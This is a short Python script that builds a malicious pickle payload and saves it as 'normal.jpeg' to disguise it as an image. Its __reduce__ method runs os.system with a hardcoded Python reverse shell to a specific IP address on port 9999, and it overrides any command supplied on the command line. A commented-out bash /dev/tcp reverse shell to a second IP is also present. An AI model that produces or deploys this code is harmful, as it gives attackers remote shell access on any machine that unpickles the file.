#!/bin/python3

import pickle,base64,os,sys

try:
	if(sys.argv[1] == "--help" or sys.argv[1] == "-h"):
		print("""\nUSAGE\n=====\n./pickle-payload-gen.py <payload>\n""")
		sys.exit()

	command = sys.argv[1]

except IndexError:
	print("\n[-] No payload specified sticking with default payload => id\n")
	command = "id"

# command = "bash -i >& /dev/tcp/52.66.184.168/9999 0>&1"
command = '''export RHOST="13.126.82.30";export RPORT=9999;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")\''''

class PAYLOAD():
    def __reduce__(self):
        import os
        return (os.system,("{}".format(command),))

payload = pickle.dumps(PAYLOAD(), protocol=0)
print(payload)
open("normal.jpeg", "wb").write(payload)
# b64Encoded = base64.b64encode(pickle.dumps(PAYLOAD(), protocol=0)).decode("utf-8")
# print("Payload (Base64) => {}".format(b64Encoded))
